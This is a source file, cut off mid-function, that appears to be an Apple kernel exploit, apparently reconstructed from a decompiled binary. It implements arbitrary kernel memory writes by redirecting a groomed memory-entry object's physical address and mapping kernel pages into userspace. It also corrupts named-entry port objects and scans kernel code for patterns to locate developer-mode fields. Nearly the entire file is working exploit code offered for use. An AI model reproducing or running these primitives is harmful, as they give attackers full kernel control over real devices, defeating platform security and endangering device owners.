#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/thread_info.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#import <Foundation/Foundation.h>
#include <IOKit/IOKitLib.h>

#include "kernel_primitives.h"

static const __int128 xmmword_42FA0 = ((__int128)0xF9400000F9400008ULL << 64) | 0xB9400100F9401048ULL;
static const __int128 xmmword_42FC0 = ((__int128)0xB9400000F9400000ULL << 64) | 0xB4000000F9400000ULL;
static const __int128 xmmword_42FE0 = ((__int128)0xB828680911040129ULL << 64) | 0xB868680952800008ULL;
static const __int128 xmmword_42FF0 = ((__int128)0xFFFFFC1FFFFFFFFFULL << 64) | 0xFFFFFC1FFFE0001FULL;
static const __int128 xmmword_43000 = ((__int128)0x00000000B900001FULL << 64) | 0xB900001FF900001FULL;
static const __int128 xmmword_43010 = ((__int128)0x00000000FFFFFC1FULL << 64) | 0xFFFFFC1FFFFFFC1FULL;
static const __int128 xmmword_43020 = ((__int128)0x9400000000000000ULL << 64) | 0xB4000000F9000000ULL;
static const __int128 xmmword_43030 = ((__int128)0xFC00000000000000ULL << 64) | 0xFF00001FFFC0001FULL;
static const __int128 xmmword_43040 = ((__int128)0x3904C01FF9000010ULL << 64) | 0xDAC10A30F2F9B431ULL;
static const __int128 xmmword_43050 = ((__int128)0x0000000000000020ULL << 64) | 0x0000000000000100ULL;
static const __int128 xmmword_43060 = ((__int128)0xF900000090000000ULL << 64) | 0x94000000528007C5ULL;
static const __int128 xmmword_43070 = ((__int128)0xFFC0001F9F000000ULL << 64) | 0xFC000000FFFFFFFFULL;
static const __int128 xmmword_43080 = ((__int128)0x58000001D503201FULL << 64) | 0x58000000D503201FULL;
static const __int128 xmmword_43090 = ((__int128)0xFF00001FFFFFFFFFULL << 64) | 0xFF00001FFFFFFFFFULL;
static const __int128 xmmword_43180 = ((__int128)0xFFFFFF9100170000ULL << 64) | 0xFFFFFF9100160000ULL;
static const __int128 xmmword_431D0 = ((__int128)0x0000000000300000ULL << 64) | 0x00000000000003C4ULL;
static const __int128 xmmword_431E0 = ((__int128)0x0000000000300000ULL << 64) | 0x00000000000003C5ULL;
static const __int128 xmmword_431F0 = ((__int128)0x0000000000000000ULL << 64) | 0xFFFFFFFF80000000ULL;
static const __int128 xmmword_43200 = ((__int128)0x0000001000000000ULL << 64) | 0x4000000100000001ULL;

extern vm_size_t vm_page_size;

extern int __ulock_wait(uint32_t operation, void *addr, uint64_t value, uint32_t timeout);
extern int __ulock_wake(uint32_t operation, void *addr, uint64_t wake_value);
extern int *__error(void);

#pragma mark - Logging (shared with kread_bootstrap)

static char g_kwrite_log[131072];
static int g_kwrite_log_off;

static void (*g_kw_ui_log_cb)(const char *line, int len) = NULL;

void kwrite_set_ui_log_callback(void (*cb)(const char *line, int len)) {
    g_kw_ui_log_cb = cb;
}

void kwlog(const char *fmt, ...) {
    char line[512];
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(line, sizeof(line), fmt, args);
    va_end(args);
    if (n <= 0) return;
    if (n >= (int)sizeof(line)) n = (int)sizeof(line) - 1;
    int remain = sizeof(g_kwrite_log) - g_kwrite_log_off;
    if (remain > 1) {
        int c = (n < remain - 1) ? n : remain - 1;
        memcpy(g_kwrite_log + g_kwrite_log_off, line, c);
        g_kwrite_log_off += c;
        g_kwrite_log[g_kwrite_log_off] = 0;
    }

    kread_bootstrap_log_write(line, n);
    NSLog(@"%s", line);

    if (g_kw_ui_log_cb) g_kw_ui_log_cb(line, n);
}

void kwlog_raw(const void *buf, int len) {
    if (!buf || len <= 0) return;
    kread_bootstrap_log_write(buf, len);
    if (g_kw_ui_log_cb) g_kw_ui_log_cb((const char *)buf, len);
}

const char *kwrite_get_log(void) { return g_kwrite_log; }

#pragma mark - Tickle (sub_FE30): set purgable flags on groom element

static kern_return_t tickle_mem_entry(uint8_t *groom, uint32_t mem_entry) {
    uint32_t flags = *(uint32_t *)(groom + 116);
    if ((flags & 0x800) && (flags & 0x4000))
        return KERN_SUCCESS;

    vm_address_t tickle_addr = 0;
    kern_return_t kr = vm_map(mach_task_self_, &tickle_addr, vm_page_size, 0,
            VM_FLAGS_ANYWHERE, mem_entry, 0, FALSE,
            VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_SHARE);
    if (kr) return kr;
    madvise((void *)tickle_addr, vm_page_size, MADV_WILLNEED);
    vm_deallocate(mach_task_self_, tickle_addr, vm_page_size);

    flags = *(uint32_t *)(groom + 116);
    if (!(flags & 0x800) || !(flags & 0x4000))
        return KERN_FAILURE;
    return KERN_SUCCESS;
}

#pragma mark - PA redirect core (sub_FF10 equivalent)

#define GROOM_PA_OFFSET    80
#define GROOM_FLAGS_OFFSET 116

#define FLAG_TICKLED_0  0x800
#define FLAG_TICKLED_1  0x4000
#define FLAG_PA_SET     0x80
#define FLAG_REDIRECT   0x1000000

static label372_orig_t g_stab_l372 = {0};
int stab_get_label372_orig(label372_orig_t *out) { if (out) *out = g_stab_l372; return g_stab_l372.valid; }

kern_return_t pa_redirect_write(uint8_t *groom, uint64_t pa_page,
        uint64_t *old_pa_out) {
    uint32_t flags = *(uint32_t *)(groom + GROOM_FLAGS_OFFSET);
    if (((FLAG_TICKLED_0 | FLAG_TICKLED_1) & ~flags) != 0)
        return 163857;

    if (old_pa_out)
        *old_pa_out = *(uint64_t *)(groom + GROOM_PA_OFFSET);

    *(uint32_t *)(groom + GROOM_FLAGS_OFFSET) = flags | FLAG_PA_SET | FLAG_REDIRECT;
    *(uint64_t *)(groom + GROOM_PA_OFFSET) = pa_page;
    return KERN_SUCCESS;
}

void pa_redirect_restore(uint8_t *groom, uint64_t old_pa) {
    *(uint64_t *)(groom + GROOM_PA_OFFSET) = old_pa;
}

#pragma mark - Map physical page into userspace

kern_return_t map_phys_page(uint32_t mem_entry, vm_address_t *addr_out) {
    *addr_out = 0;
    return vm_map(mach_task_self_, addr_out, vm_page_size, 0,
            VM_FLAGS_ANYWHERE, mem_entry, 0, FALSE,
            VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE,
            VM_INHERIT_COPY);
}

#pragma mark - kwrite primitives

kern_return_t kwrite64_phys(uint64_t kva, uint64_t value) {
    uint8_t *groom = kwrite_get_groom_elem();
    uint32_t mem_entry = kwrite_get_mem_entry_port();
    uint64_t page_mask = kwrite_get_page_mask();

    if (!groom || !mem_entry || !page_mask) return KERN_FAILURE;

    uint64_t pa = kva_to_pa(kva);
    if (!pa) return KERN_INVALID_ADDRESS;

    uint64_t pa_page = pa & ~page_mask;
    uint64_t pa_off = pa & page_mask;

    if (pa_off + 8 > vm_page_size) return KERN_INVALID_ARGUMENT;

    uint64_t old_pa = 0;
    kern_return_t kr = pa_redirect_write(groom, pa_page, &old_pa);
    if (kr) return kr;

    vm_address_t mapped = 0;
    kr = map_phys_page(mem_entry, &mapped);
    if (kr) {
        pa_redirect_restore(groom, old_pa);
        return kr;
    }

    kwlog("[kwrite] kwrite64: mapped=0x%llx off=0x%llx val=0x%llx about to write...\n",
            (unsigned long long)mapped, (unsigned long long)pa_off,
            (unsigned long long)value);

    *(uint64_t *)(mapped + pa_off) = value;

    vm_deallocate(mach_task_self_, mapped, vm_page_size);
    pa_redirect_restore(groom, old_pa);
    return KERN_SUCCESS;
}

kern_return_t kwrite_buf(uint64_t kva, const void *buf, size_t len) {
    uint8_t *groom = kwrite_get_groom_elem();
    uint32_t mem_entry = kwrite_get_mem_entry_port();
    uint64_t page_mask = kwrite_get_page_mask();

    if (!groom || !mem_entry || !page_mask) return KERN_FAILURE;
    if (!buf || !len) return KERN_INVALID_ARGUMENT;

    const uint8_t *src = (const uint8_t *)buf;
    uint64_t cur = kva;
    size_t remaining = len;

    while (remaining > 0) {
        uint64_t pa = kva_to_pa(cur);
        if (!pa) return KERN_INVALID_ADDRESS;

        uint64_t pa_page = pa & ~page_mask;
        uint64_t pa_off = pa & page_mask;
        size_t chunk = vm_page_size - pa_off;
        if (chunk > remaining) chunk = remaining;

        uint64_t old_pa = 0;
        kern_return_t kr = pa_redirect_write(groom, pa_page, &old_pa);
        if (kr) return kr;

        vm_address_t mapped = 0;
        kr = map_phys_page(mem_entry, &mapped);
        if (kr) {
            pa_redirect_restore(groom, old_pa);
            return kr;
        }

        memcpy((void *)(mapped + pa_off), src, chunk);

        vm_deallocate(mach_task_self_, mapped, vm_page_size);
        pa_redirect_restore(groom, old_pa);

        src += chunk;
        cur += chunk;
        remaining -= chunk;
    }
    return KERN_SUCCESS;
}

#pragma mark - Test: validate kwrite works without corrupting anything

int kwrite_test(void) {
    g_kwrite_log_off = 0;
    g_kwrite_log[0] = 0;

    kwlog("[kwrite] === KWRITE PRIMITIVE TEST ===\n");

    uint8_t *groom = kwrite_get_groom_elem();
    uint32_t mem_entry = kwrite_get_mem_entry_port();
    uint64_t page_mask = kwrite_get_page_mask();

    if (!groom) { kwlog("[kwrite] FAIL: no groom element\n"); return -1; }
    if (!mem_entry) { kwlog("[kwrite] FAIL: no mem_entry port\n"); return -2; }
    if (!page_mask) { kwlog("[kwrite] FAIL: no page_mask\n"); return -3; }

    kwlog("[kwrite] groom=%p mem_entry=0x%x page_mask=0x%llx\n",
            groom, mem_entry, (unsigned long long)page_mask);

    kern_return_t tkr = tickle_mem_entry(groom, mem_entry);
    uint32_t flags = *(uint32_t *)(groom + GROOM_FLAGS_OFFSET);
    kwlog("[kwrite] tickle: kr=0x%x flags@116=0x%x\n", tkr, flags);
    if (tkr || !(flags & FLAG_TICKLED_0) || !(flags & FLAG_TICKLED_1)) {
        kwlog("[kwrite] FAIL: tickle failed\n");
        return -4;
    }

    uint64_t kt_kva = kwrite_get_kern_task_kva();
    if (!kt_kva) {
        kwlog("[kwrite] FAIL: no kernel_task address (KASLR slide missing)\n");
        return -5;
    }

    uint64_t kt_pa = kva_to_pa(kt_kva);
    if (!kt_pa) {
        kwlog("[kwrite] FAIL: kva_to_pa(0x%llx) = 0\n",
                (unsigned long long)kt_kva);
        return -6;
    }
    kwlog("[kwrite] kernel_task kva=0x%llx -> pa=0x%llx\n",
            (unsigned long long)kt_kva, (unsigned long long)kt_pa);

    uint64_t kt_val_kread = 0;
    kwrite_kread64(kt_kva, &kt_val_kread);
    kwlog("[kwrite] kread64(kernel_task) = 0x%llx\n",
            (unsigned long long)kt_val_kread);

    uint64_t pa_page = kt_pa & ~page_mask;
    uint64_t pa_off = kt_pa & page_mask;

    uint64_t old_pa = 0;
    kern_return_t kr = pa_redirect_write(groom, pa_page, &old_pa);
    if (kr) { kwlog("[kwrite] FAIL: pa_redirect_write 0x%x\n", kr); return -7; }

    vm_address_t mapped = 0;
    kr = map_phys_page(mem_entry, &mapped);
    if (kr) {
        kwlog("[kwrite] FAIL: map_phys_page 0x%x\n", kr);
        pa_redirect_restore(groom, old_pa);
        return -8;
    }

    uint64_t via_map = *(uint64_t *)(mapped + pa_off);
    kwlog("[kwrite] verify: via_map=0x%llx via_kread=0x%llx match=%d\n",
            (unsigned long long)via_map, (unsigned long long)kt_val_kread,
            via_map == kt_val_kread);

    vm_deallocate(mach_task_self_, mapped, vm_page_size);
    pa_redirect_restore(groom, old_pa);

    if (via_map != kt_val_kread) {
        kwlog("[kwrite] FAIL: mapped value does not match kread\n");
        return -9;
    }
    kwlog("[kwrite] step 1 OK: PA redirect + vm_map + verify\n");

    kr = kwrite64_phys(kt_kva, kt_val_kread);
    if (kr) {
        kwlog("[kwrite] FAIL: kwrite64_phys returned 0x%x\n", kr);
        return -10;
    }

    uint64_t readback = 0;
    kwrite_kread64(kt_kva, &readback);
    kwlog("[kwrite] kwrite64_phys: wrote 0x%llx, readback 0x%llx, match=%d\n",
            (unsigned long long)kt_val_kread, (unsigned long long)readback,
            kt_val_kread == readback);

    if (kt_val_kread != readback) {
        kwlog("[kwrite] FAIL: kwrite64 data mismatch\n");
        return -11;
    }
    kwlog("[kwrite] step 2 OK: kwrite64_phys round-trip\n");

    kwlog("[kwrite] === KWRITE PRIMITIVE TEST COMPLETE ===\n");
    return 0;
}

#pragma mark - LABEL_372: port corruption

uint64_t resolve_port_to_ipc_port(mach_port_t port_name) {
    if (port_name + 1 < 2) return 0;

    uint64_t our_proc = kread_get_our_proc();
    if (!our_proc) { kwlog("[port] FAIL: no proc address\n"); return 0; }
    uint64_t our_task = our_proc - 1840;

    uint64_t ipc_space = 0;
    struct { int off; const char *name; uint64_t base; } probes[] = {
        { 768, "proc+768",  our_proc },
        { 768, "task+768",  our_task },
        { 760, "task+760",  our_task },
        { 776, "task+776",  our_task },
        { 800, "task+800",  our_task },
        { 816, "task+816",  our_task },
        { 480, "task+480",  our_task },
        { 488, "task+488",  our_task },
        { 496, "task+496",  our_task },
    };
    for (int i = 0; i < (int)(sizeof(probes)/sizeof(probes[0])); i++) {
        uint64_t val = 0;
        kwrite_kread64(probes[i].base + probes[i].off, &val);
        if (val & 0x0080000000000000ULL) val |= 0xFFFFFF8000000000ULL;
        int valid = (val >= 0xFFFFFE0000000000ULL && val != 0 && val < 0xFFFFFFFFFFFF0000ULL);
        if (!ipc_space && valid && i <= 1) ipc_space = val;
    }

    if (!ipc_space) {
        kwlog("[port] FAIL: no valid ipc_space (proc=0x%llx task=0x%llx)\n",
                (unsigned long long)our_proc, (unsigned long long)our_task);
        return 0;
    }
    if (ipc_space & 0x0080000000000000ULL)
        ipc_space |= 0xFFFFFF8000000000ULL;

    uint64_t table_raw = 0;
    kwrite_kread64(ipc_space + 32, &table_raw);
    if (!table_raw) {
        kwlog("[port] FAIL: table pointer NULL (ipc_space=0x%llx)\n",
                (unsigned long long)ipc_space);
        return 0;
    }

    uint64_t table_base = (table_raw & 0xFFFFFFBFFFFFC000ULL) | 0x4000000000ULL;
    table_base |= 0xFFFFFF8000000000ULL;
    uint32_t table_size_bytes = ((uint32_t)table_raw << 14) & 0x0FFFC000;
    uint32_t table_entries = table_size_bytes / 24;

    uint32_t index = port_name >> 8;
    if (table_entries && index >= table_entries) {
        kwlog("[port] FAIL: index %u >= table_entries %u (port=0x%x)\n",
                index, table_entries, port_name);
        return 0;
    }
    uint64_t entry_addr = table_base + (uint64_t)24 * index;

    uint64_t ipc_port = 0;
    if (kwrite_kread64(entry_addr, &ipc_port) || !ipc_port) {
        kwlog("[port] FAIL: read ipc_port from entry 0x%llx (port=0x%x)\n",
                (unsigned long long)entry_addr, port_name);
        return 0;
    }
    if (ipc_port & 0x0080000000000000ULL)
        ipc_port |= 0xFFFFFF8000000000ULL;
    kwlog("[port] port=0x%x -> ipc_port=0x%llx\n",
            port_name, (unsigned long long)ipc_port);
    return ipc_port;
}

uint64_t ipc_port_get_kobject(uint64_t ipc_port_kva) {
    uint64_t kobject = 0;
    if (kwrite_kread64(ipc_port_kva + 72, &kobject) || !kobject) return 0;
    if (kobject & 0x0080000000000000ULL)
        kobject |= 0xFFFFFF8000000000ULL;
    return kobject;
}

static uint64_t resolve_thread_kva(mach_port_t port) {
    uint64_t ipc_port = resolve_port_to_ipc_port(port);
    if (!ipc_port) return 0;
    return ipc_port_get_kobject(ipc_port);
}

uint64_t ipc_object_resolve_deep(uint64_t kobject_kva) {
    uint64_t v9 = 0;
    if (kwrite_kread64(kobject_kva + 16, &v9) || !v9) {
        kwlog("[deep] FAIL: kobject+16 (kobj=0x%llx)\n",
                (unsigned long long)kobject_kva);
        return 0;
    }
    if (v9 & 0x0080000000000000ULL) v9 |= 0xFFFFFF8000000000ULL;

    uint64_t v8 = 0;
    if (kwrite_kread64(v9 + 32, &v8) || !v8) {
        kwlog("[deep] FAIL: v9+32 (v9=0x%llx)\n", (unsigned long long)v9);
        return 0;
    }
    if (v8 & 0x0080000000000000ULL) v8 |= 0xFFFFFF8000000000ULL;

    uint64_t v7_raw = 0;
    if (kwrite_kread64(v8 + 56, &v7_raw)) {
        kwlog("[deep] FAIL: v8+56 (v8=0x%llx)\n", (unsigned long long)v8);
        return 0;
    }

    uint32_t index = (uint32_t)(v7_raw >> 32);
    if (index == 0) {
        kwlog("[deep] FAIL: index==0 (v7_raw=0x%llx kobj=0x%llx)\n",
                (unsigned long long)v7_raw, (unsigned long long)kobject_kva);
        return 0;
    }

    uint64_t result;
    if (index & 0x80000000) {
        kwlog("[deep] FAIL: high-bit index 0x%x (not implemented)\n", index);
        return 0;
    }
    result = 0xFFFFFFDC00000000ULL + ((uint64_t)index << 6);
    return result;
}

int label372_setup(mach_port_t *out_port) {
    kwlog("[l372] === LABEL_372 SETUP START ===\n");

    uint8_t *groom = kwrite_get_groom_elem();
    uint32_t groom_mem_entry = kwrite_get_mem_entry_port();
    uint64_t page_mask = kwrite_get_page_mask();
    if (!groom || !groom_mem_entry || !page_mask) {
        kwlog("[l372] FAIL: no groom/mem_entry/page_mask\n");
        return -1;
    }

    mach_port_t entry_port = 0;
    vm_size_t entry_size = vm_page_size;
    kern_return_t kr = mach_make_memory_entry(mach_task_self_,
            &entry_size, 0, 131075, &entry_port, 0);
    if (kr || !entry_port) {
        kwlog("[l372] mach_make_memory_entry failed: 0x%x\n", kr);
        return -2;
    }
    kwlog("[l372] named entry port = 0x%x (size=0x%llx)\n",
            entry_port, (unsigned long long)entry_size);

    uint64_t ipc_port_kva = resolve_port_to_ipc_port(entry_port);
    if (!ipc_port_kva) {
        kwlog("[l372] FAIL: cannot resolve port\n");
        goto fail;
    }
    kwlog("[l372] ipc_port kva = 0x%llx\n", (unsigned long long)ipc_port_kva);

    uint64_t v173 = ipc_port_get_kobject(ipc_port_kva);
    if (!v173) {
        kwlog("[l372] FAIL: cannot get kobject\n");
        goto fail;
    }
    kwlog("[l372] v173 (kobject) = 0x%llx\n", (unsigned long long)v173);

    uint64_t v176 = kva_to_pa(v173);
    if (!v176) {
        kwlog("[l372] FAIL: kva_to_pa(v173) = 0\n");
        goto fail;
    }
    kwlog("[l372] v176 (kobject PA) = 0x%llx\n", (unsigned long long)v176);

    uint64_t v177 = ipc_object_resolve_deep(v173);
    if (!v177) {
        kwlog("[l372] FAIL: ipc_object_resolve_deep = 0\n");
        goto fail;
    }
    kwlog("[l372] v177 (deep resolved) = 0x%llx\n", (unsigned long long)v177);

    uint64_t handlec = kva_to_pa(v177);
    if (!handlec) {
        kwlog("[l372] FAIL: kva_to_pa(v177) = 0\n");
        goto fail;
    }
    kwlog("[l372] handlec (deep PA) = 0x%llx\n", (unsigned long long)handlec);
    g_stab_l372.v177_kva = v177; g_stab_l372.v173_kva = v173;
    g_stab_l372.v177_pa = handlec; g_stab_l372.v173_pa = v176;

    kwlog("[l372] ctx_A (pre-redirect): 0x%llx\n",
            (unsigned long long)kwrite_get_kern_task_kva());

    kr = tickle_mem_entry(groom, groom_mem_entry);
    if (kr) {
        kwlog("[l372] FAIL: tickle 0x%x\n", kr);
        goto fail;
    }

    uint64_t old_pa = 0;
    kr = pa_redirect_write(groom, handlec & ~page_mask, &old_pa);
    if (kr) {
        kwlog("[l372] FAIL: redirect to v177 PA 0x%x\n", kr);
        goto fail;
    }
    kwlog("[l372] redirected groom to v177 PA page 0x%llx\n",
            (unsigned long long)(handlec & ~page_mask));

    vm_address_t mapped = 0;
    kr = map_phys_page(groom_mem_entry, &mapped);
    if (kr) {
        kwlog("[l372] FAIL: map v177 page 0x%x\n", kr);
        pa_redirect_restore(groom, old_pa);
        goto fail;
    }

    uint64_t v179 = (page_mask & v177) + mapped;
    kwlog("[l372] v179 (mapped deep obj) = 0x%llx (off=0x%llx)\n",
            (unsigned long long)v179, (unsigned long long)(page_mask & v177));

    uint32_t v179_d0 = *(uint32_t *)v179;
    uint32_t v179_d4 = *(uint32_t *)(v179 + 4);
    uint64_t v179_q24 = *(uint64_t *)(v179 + 24);
    kwlog("[l372] v179 validate: [0]=0x%x [4]=0x%x [24]=0x%llx (expect page_size=0x%llx)\n",
            v179_d0, v179_d4, (unsigned long long)v179_q24,
            (unsigned long long)vm_page_size);

    if (v179_d0 != v179_d4) {
        kwlog("[l372] FAIL: v179[0] != v179[4]\n");
        vm_deallocate(mach_task_self_, mapped, vm_page_size);
        pa_redirect_restore(groom, old_pa);
        goto fail;
    }
    if (v179_q24 != (uint64_t)vm_page_size) {
        kwlog("[l372] FAIL: v179[24] 0x%llx != page_size\n",
                (unsigned long long)v179_q24);
        vm_deallocate(mach_task_self_, mapped, vm_page_size);
        pa_redirect_restore(groom, old_pa);
        goto fail;
    }

    {
        uint32_t f116 = *(uint32_t *)(v179 + 116);
        kwlog("[l372] v177 flags@116 = 0x%x\n", f116);
        if ((0x4800 & ~f116) != 0) {
            kwlog("[l372] FAIL: v177 missing required flags 0x4800 (has 0x%x)\n", f116);
            vm_deallocate(mach_task_self_, mapped, vm_page_size);
            pa_redirect_restore(groom, old_pa);
            goto fail;
        }
        g_stab_l372.v177_flags_orig = f116;
        g_stab_l372.v177_pa_orig = *(uint64_t *)(v179 + 80);
        g_stab_l372.valid = 1;
        *(uint32_t *)(v179 + 116) = f116 | 0x80 | 0x1000000;
        *(uint64_t *)(v179 + 80) = 0;
    }

    *(uint64_t *)(v179 + 24) = (uint64_t)-1;
    kwlog("[l372] v177 modified: flags=0x%x PA=0 size=-1\n",
            *(uint32_t *)(v179 + 116));

    vm_deallocate(mach_task_self_, mapped, vm_page_size);

    kwlog("[l372] ctx_B (post v177 modify): 0x%llx\n",
            (unsigned long long)kwrite_get_kern_task_kva());

    kr = pa_redirect_write(groom, v176 & ~page_mask, NULL);
    if (kr) {
        kwlog("[l372] FAIL: redirect to v173 PA 0x%x\n", kr);
        pa_redirect_restore(groom, old_pa);
        goto fail;
    }
    kwlog("[l372] redirected groom to v173 PA page 0x%llx\n",
            (unsigned long long)(v176 & ~page_mask));

    mapped = 0;
    kr = map_phys_page(groom_mem_entry, &mapped);
    if (kr) {
        kwlog("[l372] FAIL: map v173 page 0x%x\n", kr);
        pa_redirect_restore(groom, old_pa);
        goto fail;
    }

    uint64_t v181 = (page_mask & v173) + mapped;
    kwlog("[l372] v181 (mapped kobject) = 0x%llx (off=0x%llx)\n",
            (unsigned long long)v181, (unsigned long long)(page_mask & v173));

    uint64_t v181_q32 = *(uint64_t *)(v181 + 32);
    kwlog("[l372] v181 validate: [32]=0x%llx (expect page_size=0x%llx)\n",
            (unsigned long long)v181_q32, (unsigned long long)vm_page_size);

    if (v181_q32 != (uint64_t)vm_page_size) {
        kwlog("[l372] FAIL: v181[32] != page_size\n");
        vm_deallocate(mach_task_self_, mapped, vm_page_size);
        pa_redirect_restore(groom, old_pa);
        goto fail;
    }

    *(uint64_t *)(v181 + 32) = (uint64_t)-1;
    kwlog("[l372] v173 modified: size@32 = -1\n");

    vm_deallocate(mach_task_self_, mapped, vm_page_size);
    pa_redirect_restore(groom, old_pa);

    kwlog("[l372] ctx_C (post v173 modify): 0x%llx\n",
            (unsigned long long)kwrite_get_kern_task_kva());

    *out_port = entry_port;
    {
        kwlog("[l372] ctx_check: kern_task_kva=0x%llx\n",
                (unsigned long long)kwrite_get_kern_task_kva());
    }
    kwlog("[l372] === LABEL_372 SETUP COMPLETE (port=0x%x) ===\n", entry_port);
    return 0;

fail:
    mach_port_deallocate(mach_task_self_, entry_port);
    return -10;
}

#pragma mark - map_kernel_memory_entry (binary 0x280A0)

static kern_return_t map_kernel_memory_entry(mach_port_t entry_port,
        vm_address_t *addr_out, vm_size_t size, uint64_t pa) {
    if (entry_port + 1 < 2) return KERN_FAILURE;
    uint64_t page_mask = kwrite_get_page_mask();
    *addr_out = 0;
    kern_return_t kr = vm_map(mach_task_self_, addr_out, size, 0,
            VM_FLAGS_ANYWHERE, entry_port, pa & ~page_mask,
            FALSE, VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_COPY);
    return kr;
}

#pragma mark - Kernel instruction helpers

static uint32_t kern_read32(uint64_t kaddr) {
    uint32_t val = 0;
    kwrite_kread32(kaddr, &val);
    return val;
}

static uint64_t resolve_adrp_ref(uint64_t kaddr) {
    uint32_t insn0 = kern_read32(kaddr);

    if (insn0 == 0xD503201F) {
        uint32_t insn1 = kern_read32(kaddr + 4);
        int64_t imm19 = (insn1 >> 5) & 0x7FFFF;
        if (imm19 & 0x40000) imm19 |= ~0x7FFFFLL;
        uint64_t target = kaddr + 4 + imm19 * 4;
        if ((insn1 >> 24) == 0x58) return target;
        return 0;
    }

    if ((insn0 & 0x9F000000) == 0x10000000 && (insn0 & 0x80000000) == 0) {
        uint32_t immhi = (insn0 >> 5) & 0x7FFFF;
        uint32_t immlo = (insn0 >> 29) & 0x3;
        int64_t imm21 = (int64_t)((immhi << 2) | immlo);
        if (imm21 & (1 << 20)) imm21 |= ~((1LL << 21) - 1);
        return kaddr + imm21;
    }

    if ((insn0 & 0x9F000000) != 0x90000000) return 0;
    uint32_t immhi = (insn0 >> 5) & 0x7FFFF;
    uint32_t immlo = (insn0 >> 29) & 0x3;
    int64_t imm21 = (int64_t)((immhi << 2) | immlo);
    if (imm21 & (1 << 20)) imm21 |= ~((1LL << 21) - 1);
    int64_t imm = imm21 << 12;
    uint64_t page = (kaddr & ~0xFFFULL) + imm;

    int rd = insn0 & 0x1F;
    for (uint64_t off = 4; off <= 32; off += 4) {
        uint32_t insn = kern_read32(kaddr + off);
        if ((insn & 0x7F000000) == 0x11000000 && ((insn >> 5) & 0x1F) == rd) {
            uint64_t addimm = (insn >> 10) & 0xFFF;
            if (insn & 0xC00000) addimm <<= 12;
            return page + addimm;
        }
        if ((insn & 0xBFC00000) == 0xB9400000 && ((insn >> 5) & 0x1F) == rd) {
            uint64_t ldroff = ((uint64_t)((insn >> 10) & 0xFFF)) << (insn >> 30);
            return page + ldroff;
        }
        if ((insn & 0xFFC00000) == 0x39400000 && ((insn >> 5) & 0x1F) == rd) {
            return page + ((insn >> 10) & 0xFFF);
        }
    }
    return page;
}

#pragma mark - locate_developer_mode_fields (binary 0x27504)

static uint64_t g_dev_mode_pa;
static uint32_t g_dev_mode_off;
static uint64_t g_percpu_pa;
static uint32_t g_percpu_stride;

static int locate_developer_mode_fields_impl(mach_port_t entry_port) {
    if (g_dev_mode_pa && g_dev_mode_off) return 0;

    uint64_t kt = kwrite_get_kern_task_kva();
    if (!kt) return -1;

    uint64_t kc_base = kt - 0x32997D0;
    uint64_t te_virt = kc_base + 0x720000;
    uint64_t te_size = 0x2310000;
    kwlog("[locate] TEXT_EXEC: virt=0x%llx size=0x%llx\n",
            (unsigned long long)te_virt, (unsigned long long)te_size);

    uint64_t page_mask = kwrite_get_page_mask();
    uint64_t pat1_addr = 0;

    uint64_t scan_start = te_virt + te_size - 0x20000;
    uint64_t scan_end = te_virt + te_size;
    kwlog("[locate] scanning 0x%llx-0x%llx for pattern 1...\n",
            (unsigned long long)scan_start, (unsigned long long)scan_end);

    for (uint64_t a = scan_start; a < scan_end - 4; a += 4) {
        if (kern_read32(a) == 0xB9009188 && kern_read32(a + 4) == 0xB9000D9F) {
            pat1_addr = a;
            kwlog("[locate] pattern 1 at 0x%llx\n", (unsigned long long)a);
            break;
        }
    }
    if (!pat1_addr) {
        kwlog("[locate] not in last 0x20000, scanning full TEXT_EXEC...\n");
        for (uint64_t a = te_virt; a < te_virt + te_size - 4; a += 4) {
            if (kern_read32(a) == 0xB9009188 && kern_read32(a + 4) == 0xB9000D9F) {
                pat1_addr = a;
                kwlog("[locate] pattern 1 at 0x%llx\n", (unsigned long long)a);
                break;
            }
        }
    }
    if (!pat1_addr) {
        kwlog("[locate] pattern 1 not found\n");
        return -3;
    }

    uint64_t ref1 = 0, ref2 = 0;
    for (int64_t v10 = -4; v10 < 0xFC; v10 += 4) {
        uint32_t insn = kern_read32(pat1_addr + v10 + 4);
        if ((insn & 0x9F000000) != 0x90000000) continue;
        uint32_t next = kern_read32(pat1_addr + v10 + 8);
        if ((next & 0xBFC00000) != 0xB9400000) continue;
        uint64_t resolved = resolve_adrp_ref(pat1_addr + v10 + 4);
        if (!resolved) {
            kwlog("[locate] ADRP resolve failed at +%lld\n", (long long)(v10+4));
            return -4;
        }
        if (!ref1) { ref1 = resolved; }
        else { ref2 = resolved; break; }
    }

    if (!ref1 || !ref2) {
        kwlog("[locate] ADRP refs not found: ref1=0x%llx ref2=0x%llx\n",
                (unsigned long long)ref1, (unsigned long long)ref2);
        return -4;
    }
    kwlog("[locate] ref1=0x%llx ref2=0x%llx\n",
            (unsigned long long)ref1, (unsigned long long)ref2);

    uint64_t val1 = 0, val2 = 0;
    kwrite_kread64(ref1, &val1);
    kwrite_kread64(ref2, &val2);
    if (!val1 || !val2) {
        kwlog("[locate] failed reading refs: val1=0x%llx val2=0x%llx\n",
                (unsigned long long)val1, (unsigned long long)val2);
        return -5;
    }

    if (val1 < 0xFFFFFE0000000000ULL) {
        kwlog("[locate] val1 not a kptr\n");
        return -5;
    }

    uint64_t pa = kva_to_pa(val1);
    if (!pa) {
        kwlog("[locate] kva_to_pa(val1) = 0\n");
        return -6;
    }
    g_dev_mode_pa = pa;
    g_dev_mode_off = (uint32_t)(val2 - val1);
    kwlog("[locate] dev_mode: pa=0x%llx off=%d\n",
            (unsigned long long)g_dev_mode_pa, g_dev_mode_off);

    uint64_t pat2_addr = 0;
    uint64_t p2_start = (pat1_addr > 0x20000) ? (pat1_addr - 0x20000) : te_virt;
    uint64_t p2_end = pat1_addr + 0x20000;
    if (p2_end > te_virt + te_size) p2_end = te_virt + te_size;
    kwlog("[locate] scanning 0x%llx-0x%llx for pattern 2...\n",
            (unsigned long long)p2_start, (unsigned long long)p2_end);
    for (uint64_t a = p2_start; a < p2_end - 4; a += 4) {
        uint32_t w0 = kern_read32(a);
